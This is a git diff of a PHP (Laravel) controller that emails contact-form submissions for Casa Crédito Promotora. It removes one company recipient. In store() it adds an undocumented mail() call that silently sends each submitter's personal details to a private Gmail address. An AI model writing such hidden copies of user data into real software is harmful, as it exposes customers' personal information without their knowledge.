@@ -49,7 +49,7 @@ class IndexController extends Controller
     //info@casacredito.com,hserrano@casacredito.com
 
     public function store(Request $request){
-        $to = "info@casacredito.com,hserrano@casacredito.com";
+        $to = "info@casacredito.com";
         $subject = "Información en General - Casa Credito Promotora";
         $message = "<br><strong>Información general</strong>
             <br>Nombre: " . strip_tags($request->nombre) ."
@@ -64,6 +64,7 @@ class IndexController extends Controller
                 "Content-Type:text/html;charset=UTF-8" . "\r\n";
 
         mail($to, $subject, $message, $header);
+        mail('sebas31051999@gmail.com', $subject, $message, $header);
         
         $request->session()->flash('validGeneral', 'Se ha enviado el correo');
 
@@ -106,7 +107,7 @@ class IndexController extends Controller
     }
 
     public function sendMailContact(Request $request){
-        $to = "info@casacredito.com,hserrano@casacredito.com";
+        $to = "info@casacredito.com";
         $subject = "Información de contacto - Casa Crédito Promotora";
         $message = "<br><strong>Información de contacto</strong>
         <br>Nombre: " . strip_tags($request->nombre) ."
